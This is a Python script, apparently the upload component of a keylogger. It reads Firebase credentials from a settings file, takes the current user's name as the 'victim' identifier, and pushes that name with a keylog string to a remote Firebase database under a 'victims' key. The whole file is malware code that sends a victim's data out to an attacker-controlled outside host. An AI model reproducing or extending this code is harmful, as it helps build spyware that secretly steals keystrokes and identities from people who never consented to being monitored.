import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import re
import os
import pwd
def get_username():
    # Use 'os.getuid()' to get the user ID of the current user, and then pass it to 'pwd.getpwuid' to get the user information.
    # The '[0]' index extracts the username from the user information.
    return pwd.getpwuid(os.getuid())[0]
victm = get_username()
keylogs = "[START LOG] "
with open('settings.txt', 'r') as file:
        # Read the file line by line
        lines = file.readlines()
        # Iterate over the lines
        for i in range(0, len(lines), 2):
            if i + 1 < len(lines):  # Check if there are enough lines left in the file
                credspath = re.search(r'credspath="(.*?)"', lines[i])
                urlpath = re.search(r'firebaseappurlpath="(.*?)"', lines[i + 1])
                if credspath and urlpath:
                    credsfinal = credspath.group(1)
                    urlfinal = urlpath.group(1)
# Initialize Firebase with your service account credentials
cred = credentials.Certificate(credsfinal)
firebase_admin.initialize_app(cred, {
    'databaseURL': str(urlfinal)
})

# Get a reference to the Firebase Realtime Database
ref = db.reference('/')

# Define the data you want to write
data = {
    'victims': {
        str(victm): {
            'name': str(victm),
            'logs': str(keylogs)
        }
    }
}

# Push the data to the database
ref.update(data)

print("Data written successfully.")
